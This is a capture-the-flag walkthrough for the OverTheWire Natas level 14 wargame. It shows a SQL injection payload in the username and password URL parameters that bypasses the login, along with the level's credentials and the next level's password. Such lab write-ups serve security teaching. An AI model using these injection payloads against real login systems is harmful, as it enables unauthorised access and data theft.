# [natas 14](http://natas14.natas.labs.overthewire.org)

    Username: natas14
    Password: Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

Read the sourcecode, we can browse to

    http://natas14.natas.labs.overthewire.org/?username=test&password=test&debug

We can see the username and password in double quotes.

    Executing query: SELECT * from users where username="test" and password="test"

If we add double quote in username and password, the SQL language is break.

    http://natas14.natas.labs.overthewire.org/?username="or"0"="0&password="or"0"="0&debug

    Executing query: SELECT * from users where username=""or"0"="0" and password=""or"0"="0"
    Successful login!
    The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

